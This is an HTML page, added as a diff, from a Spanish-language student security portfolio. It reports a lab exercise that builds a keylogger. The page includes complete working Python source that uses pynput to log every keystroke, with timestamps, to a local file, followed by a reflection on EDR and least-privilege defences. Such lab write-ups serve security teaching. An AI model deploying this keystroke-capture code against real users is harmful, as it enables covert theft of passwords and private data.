@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actividad 03 // Portafolio de Seguridad Informática</title>
+    
+    <!-- Fuentes de Google -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;700&family=Rajdhani:wght@400;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Tailwind CSS por CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: { cpYellow: '#FCEE0A', cpCyan: '#00F0FF', cpPink: '#FF003C', cpGray: 'rgba(24, 24, 27, 0.85)' },
+                    fontFamily: { cyber: ['Rajdhani', 'sans-serif'], mono: ['Fira Code', 'monospace'] },
+                    boxShadow: { 'neon-red': '0 0 10px #FF003C, 0 0 40px #FF003C' }
+                }
+            }
+        }
+    </script>
+    <style>
+        body { background-color: #050000; overflow-x: hidden; }
+        #matrix-bg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -2; opacity: 0.35; }
+        .css-red-glow { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 150vw; height: 150vh; z-index: -1; background: radial-gradient(circle, rgba(255,0,60,0.15) 0%, rgba(5,0,0,1) 60%); pointer-events: none; }
+        .scanlines { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; pointer-events: none; background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.2) 50%, rgba(0,0,0,0.2)); background-size: 100% 4px; }
+        .glitch-hover:hover { text-shadow: 3px 0 #FF003C, -3px 0 #00F0FF; transition: all 0.1s ease-in-out; }
+    </style>
+</head>
+<body class="font-mono text-gray-300 min-h-screen flex flex-col">
+
+    <canvas id="matrix-bg"></canvas>
+    <div class="css-red-glow"></div>
+    <div class="scanlines"></div>
+
+    <!-- Encabezado -->
+    <header class="bg-cpYellow text-black border-b-4 border-cpPink p-6 uppercase font-cyber relative overflow-hidden shadow-neon-red">
+        <div class="max-w-4xl mx-auto relative z-10 flex flex-col md:flex-row justify-between items-center gap-4">
+            <div>
+                <h1 class="text-3xl md:text-4xl font-bold tracking-wider glitch-hover">ACT. 03: KEYLOGGER</h1>
+                <p class="text-lg font-bold tracking-widest mt-1">>_ REPORTE DE PRÁCTICA</p>
+            </div>
+            <!-- Botón de regreso a Parcial 1 -->
+            <a href="parcial1.html" class="bg-black text-cpCyan border border-black hover:border-cpPink hover:text-cpPink py-2 px-4 font-bold transition-all duration-300 whitespace-nowrap">
+                [ REGRESAR AL DIRECTORIO ]
+            </a>
+        </div>
+    </header>
+
+    <main class="max-w-4xl w-full mx-auto mt-10 mb-10 p-4 space-y-8 relative z-10 flex-grow">
+        
+        <!-- Título principal de la actividad -->
+        <div class="border-b-2 border-cpCyan/30 pb-4 mb-8">
+            <h2 class="text-3xl font-cyber font-bold text-white uppercase">
+                No presiones esc... todavía
+            </h2>
+            <p class="text-cpPink font-bold mt-2">>_ Implementación y Análisis de un Keylogger</p>
+        </div>
+
+        <!-- SECCIÓN 1: De qué trata -->
+        <section class="bg-cpGray p-6 border-l-4 border-cpCyan relative group hover:border-cpPink transition-colors shadow-lg backdrop-blur-md">
+            <div class="absolute top-0 right-0 bg-cpCyan text-black font-cyber font-bold px-2 py-1 text-xs uppercase group-hover:bg-cpPink group-hover:text-white transition-colors">Data_Block_01</div>
+            <h3 class="text-2xl font-cyber font-bold text-cpCyan mb-4 uppercase flex items-center gap-2">
+                <span class="text-white group-hover:text-cpPink transition-colors">></span> 1. De qué trata la actividad
+            </h3>
+            <div class="space-y-4 text-sm md:text-base leading-relaxed">
+                <p>Esta actividad práctica consiste en la implementación y documentación de un programa informático diseñado para interceptar pulsaciones de teclado a nivel del sistema operativo.</p>
+                <p>Utilizando un modelo basado en <span class="text-cpYellow font-bold">event hooks y callbacks</span>, el programa registra cada evento de entrada. El propósito fundamental es comprender el funcionamiento técnico subyacente de este tipo de captura de información para reconocer las implicaciones que tiene en el análisis de malware y la protección de endpoints.</p>
+            </div>
+        </section>
+
+<!-- CONTENEDOR A DOS COLUMNAS -->
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+            
+            <!-- SECCIÓN 2: Objetivos -->
+            <section class="bg-cpGray p-6 border-l-4 border-cpCyan relative group hover:border-cpPink transition-colors shadow-lg backdrop-blur-md h-full">
+                <div class="absolute top-0 right-0 bg-cpCyan text-black font-cyber font-bold px-2 py-1 text-xs uppercase group-hover:bg-cpPink group-hover:text-white transition-colors">Data_Block_02</div>
+                <h3 class="text-2xl font-cyber font-bold text-cpCyan mb-4 uppercase flex items-center gap-2">
+                    <span class="text-white group-hover:text-cpPink transition-colors">></span> 2. Objetivos Específicos
+                </h3>
+                <ul class="space-y-4 text-sm md:text-base">
+                    <li class="flex items-start">
+                        <span class="text-cpPink font-bold mr-3">>></span>
+                        <p><strong class="text-white">Implementar persistencia del registro:</strong></p>
+                    </li>
+                    <li class="flex items-start">
+                        <span class="text-cpPink font-bold mr-3">>></span>
+                        <p><strong class="text-white">Establecer asociación temporal:</strong></p>
+                    </li>
+                    <li class="flex items-start">
+                        <span class="text-cpPink font-bold mr-3">>></span>
+                        <p><strong class="text-white">Análisis y documentación:</strong></p>
+                    </li>
+                </ul>
+            </section>
+
+            <!-- SECCIÓN 3: Requisitos Técnicos -->
+            <section class="bg-cpGray p-6 border-l-4 border-cpCyan relative group hover:border-cpPink transition-colors shadow-lg backdrop-blur-md h-full">
+                <div class="absolute top-0 right-0 bg-cpCyan text-black font-cyber font-bold px-2 py-1 text-xs uppercase group-hover:bg-cpPink group-hover:text-white transition-colors">Sys_Reqs</div>
+                <h3 class="text-2xl font-cyber font-bold text-cpCyan mb-4 uppercase flex items-center gap-2">
+                    <span class="text-white group-hover:text-cpPink transition-colors">></span> 3. Requisitos Técnicos
+                </h3>
+                <ul class="space-y-4 text-sm md:text-base">
+                    <li class="flex items-start">
+                        <span class="text-cpYellow font-bold mr-3">[*]</span>
+                        <p><strong class="text-white">Entorno Controlado:</strong> Máquina virtual o entorno de pruebas aislado</p>
+                    </li>
+                    <li class="flex items-start">
+                        <span class="text-cpYellow font-bold mr-3">[*]</span>
+                        <p><strong class="text-white">Lenguaje de Programación:</strong> Python 3.x.</p>
+                    </li>
+                    <li class="flex items-start">
+                        <span class="text-cpYellow font-bold mr-3">[*]</span>
+                        <p><strong class="text-white">Librerías Requeridas:</strong> <code class="bg-black text-cpCyan px-1 py-0.5 border border-cpCyan/30">pynput</code> y libreria<code class="bg-black text-cpCyan px-1 py-0.5 border border-cpCyan/30">datetime</code>.</p>
+                    </li>
+                    <li class="flex items-start">
+                        <span class="text-cpYellow font-bold mr-3">[*]</span>
+                        <p><strong class="text-white">Permisos:</strong> Privilegios de escritura en el directorio de trabajo para la generación y actualización del archivo de registro local (.txt).</p>
+                    </li>
+                </ul>
+            </section>
+        </div>
+        <!-- SECCIÓN 4: Código Fuente -->
+         <!-- CAJA DE ADVERTENCIA (WARNING) -->
+            <div class="bg-[#1a0505] border border-cpPink p-4 mb-6 shadow-[0_0_15px_rgba(255,0,60,0.3)] relative">
+                <div class="flex items-start gap-4">
+                    <!-- Ícono de alerta animado -->
+                    <div class="text-cpPink font-bold text-2xl mt-1 animate-pulse">
+                        [!]
+                    </div>
+                    <!-- Texto del aviso -->
+                    <div>
+                        <h4 class="text-cpPink font-cyber font-bold text-lg uppercase mb-1">
+                            Warning // Aviso de Responsabilidad
+                        </h4>
+                        <p class="text-gray-300 text-sm leading-relaxed">
+                            El código y la información detallada en este documento han sido desarrollados en un entorno de laboratorio controlado y tienen propósitos estrictamente académicos. Su uso fuera de este contexto de aprendizaje autorizado constituye una violación de políticas de seguridad y puede tener consecuencias legales.
+                        </p>
+                    </div>
+                </div>
+            </div>
+        <section class="bg-cpGray p-6 border-l-4 border-cpCyan relative group hover:border-cpPink transition-colors shadow-lg backdrop-blur-md">
+            <div class="absolute top-0 right-0 bg-cpCyan text-black font-cyber font-bold px-2 py-1 text-xs uppercase group-hover:bg-cpPink group-hover:text-white transition-colors">Source_Code</div>
+            <h3 class="text-2xl font-cyber font-bold text-cpCyan mb-4 uppercase flex items-center gap-2">
+                <span class="text-white group-hover:text-cpPink transition-colors">></span> 4. Código Fuente
+            </h3>
+            
+            <!-- Ventana simulada de código -->
+            <div class="bg-black border border-gray-700 p-4 relative overflow-x-auto shadow-inner group-hover:border-cpPink/50 transition-colors">
+                <div class="absolute top-2 right-2 text-gray-600 text-xs font-cyber font-bold uppercase">[ Python 3.x ]</div>
+                
+                <!--Codigo -->
+                <pre class="text-gray-300 text-sm font-mono leading-relaxed"><code>import os
+from pynput.keyboard import Key, Listener
+from datetime import datetime
+
+# Rutas para el archivo
+script_dir = os.path.dirname(os.path.abspath(__file__))
+log_filename = os.path.join(script_dir, "registro_teclas.txt")
+
+def get_formatted_timestamp():
+    """Genera la marca de tiempo en el formato YYYY-MM-DD HH:MM:SS.ms"""
+    now = datetime.now()
+    base_time = now.strftime('%Y-%m-%d %H:%M:%S')
+    ms = str(now.microsecond)[:3].zfill(3)
+    return f"{base_time}.{ms}"
+
+def log_key_event(key_name, event_type):
+    timestamp = get_formatted_timestamp()
+    # Construir la línea integrando si es PRESS o RELEASE
+    log_line = f"{timestamp} | {event_type} | {key_name}"    
+    # Imprimir en consola
+    print(log_line)
+    # Escribir en el archivo añadiendo un salto de línea
+    with open(log_filename, "a", encoding="utf-8") as file:
+        file.write(log_line + "\n")
+
+#Funcion para detectar si se presiona una tecla
+def on_press(key):
+    try:
+        key_name = key.char
+    except AttributeError:
+        key_name = str(key).replace('Key.', '')
+        
+    # Enviamos la etiqueta PRESS
+    log_key_event(key_name, "PRESS")
+#Función para detectar cuando se solto la tecla
+def on_release(key):
+    # Primero procesamos qué tecla se soltó
+    try:
+        key_name = key.char
+    except AttributeError:
+        key_name = str(key).replace('Key.', '')
+        
+    log_key_event(key_name, "RELEASE")
+
+    # Después verificamos si era la tecla para salir
+    if key == Key.esc:
+        print("Saliendo y guardando registro...")
+        return False
+    
+print("Escuchando teclas... Presiona ESC para salir.")
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+</code></pre>
+            </div>
+        </section>
+
+<!-- SECCIÓN 5: Evidencia de Ejecución (Imágenes) -->
+        <section class="bg-cpGray p-6 border-l-4 border-cpCyan relative group hover:border-cpPink transition-colors shadow-lg backdrop-blur-md">
+            <div class="absolute top-0 right-0 bg-cpCyan text-black font-cyber font-bold px-2 py-1 text-xs uppercase group-hover:bg-cpPink group-hover:text-white transition-colors">Execution_Logs</div>
+            <h3 class="text-2xl font-cyber font-bold text-cpCyan mb-4 uppercase flex items-center gap-2">
+                <span class="text-white group-hover:text-cpPink transition-colors">></span> 5. Evidencia de Ejecución
+            </h3>
+            
+            <p class="text-gray-400 text-sm mb-6">Capturas de pantalla del entorno controlado mostrando la ejecución del script y la generación del archivo de registro.</p>
+            
+            <!-- Grid para 2 imágenes -->
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                
+                <!-- Contenedor Imagen 1 -->
+                <div class="border border-cpCyan/30 p-2 bg-black/60 group-hover:border-cpPink/60 transition-colors shadow-sm">
+                    <div class="bg-[#0a0a0a] flex items-center justify-center relative border border-gray-800 p-1">
+                        <img src="Act3.png" alt="Ejecución en consola" class="w-full h-auto object-contain">
+                    </div>
+                    <p class="text-cpYellow text-xs mt-2 font-bold uppercase">> Captura_Terminal_Ejecución</p>
+                </div>
+
+                <!-- Contenedor Imagen 2 -->
+                <div class="border border-cpCyan/30 p-2 bg-black/60 group-hover:border-cpPink/60 transition-colors shadow-sm">
+                    <div class="bg-[#0a0a0a] flex items-center justify-center relative border border-gray-800 p-1">
+                        <img src="Act3.1.png" alt="Archivo de registro" class="w-full h-auto object-contain">
+                    </div>
+                    <p class="text-cpYellow text-xs mt-2 font-bold uppercase">> Captura_Archivo_Log.TXT</p>
+                </div>
+
+            </div>
+        </section>
+<!-- SECCIÓN 6: Análisis Técnico y Conclusión -->
+        <section class="bg-cpGray p-6 border-l-4 border-cpCyan relative group hover:border-cpPink transition-colors shadow-lg backdrop-blur-md">
+            <div class="absolute top-0 right-0 bg-cpCyan text-black font-cyber font-bold px-2 py-1 text-xs uppercase group-hover:bg-cpPink group-hover:text-white transition-colors">Sys_Analysis</div>
+            <h3 class="text-2xl font-cyber font-bold text-cpCyan mb-4 uppercase flex items-center gap-2">
+                <span class="text-white group-hover:text-cpPink transition-colors">></span> 6. Análisis Técnico y Reflexión
+            </h3>
+            
+            <div class="space-y-4 text-sm md:text-base leading-relaxed">
+                <p>El desarrollo y ejecución de este keylogger demuestra como algo tan simple puede llevarse a una amenaza real si no se aplican controles de privilegios estrictos. Al implementar la captura de eventos y su persistencia en un archivo local, se demuestra que tan facil se puede comprometer credenciales y datos confidenciales sin alterar la interfaz del usuario.</p>
+                
+                <p> Comprender la anatomía de estas amenazas desde un enfoque ofensivo resulta vital para poder diseñar defensas robustas. La asociación temporal (timestamps) implementada en el código no solo simula la recolección estructurada de datos por parte de un atacante, sino que también ilustra el tipo de metadatos exactos que un analista forense buscaría al trazar la línea temporal de una brecha de seguridad.</p>
+
+                <!-- Bloque destacado de Takeaway -->
+                <div class="border-l-2 border-cpPink pl-4 mt-6 bg-black/40 p-4 shadow-inner">
+                    <p class="text-cpPink font-bold text-sm uppercase mb-1">>_ Evaluación de Impacto:</p>
+                    <p class="text-gray-400 italic text-sm">Esta práctica técnica refuerza la necesidad crítica de implementar soluciones EDR (Endpoint Detection and Response) y arquitecturas de privilegios mínimos en las infraestructuras de red, con el fin de detectar comportamientos anómalos de "hooking" en los procesos del sistema en tiempo real.</p>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Pie de página -->
+    <footer class="mt-auto py-8 text-center text-xs text-gray-500 font-cyber tracking-widest uppercase relative z-10 bg-black/90 border-t border-cpPink/50 w-full">
+        <p>V.1.0.0 // &copy; 2026 Samuel López Gómez. All rights reserved.</p>
+        <p class="mt-2 text-cpPink drop-shadow-[0_0_5px_rgba(255,0,60,0.8)]">Reporte Activo // CNO IV – Seguridad Informática</p>
+    </footer>
+
+    <!-- Script Matrix -->
+    <script>
+        const canvas = document.getElementById('matrix-bg');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const charArray = "010101100100101ABCDEFGHIJKLMNOPQRSTUVWXYZｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ".split('');
+        const fontSize = 16; const columns = canvas.width / fontSize; const drops = [];
+        for (let x = 0; x < columns; x++) drops[x] = Math.random() * -100;
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(5, 0, 0, 0.1)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = '#FF003C'; ctx.font = fontSize + 'px "Fira Code", monospace';
+            for (let i = 0; i < drops.length; i++) {
+                ctx.fillText(charArray[Math.floor(Math.random() * charArray.length)], i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 33);
+        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+    </script>
+</body>
+</html>
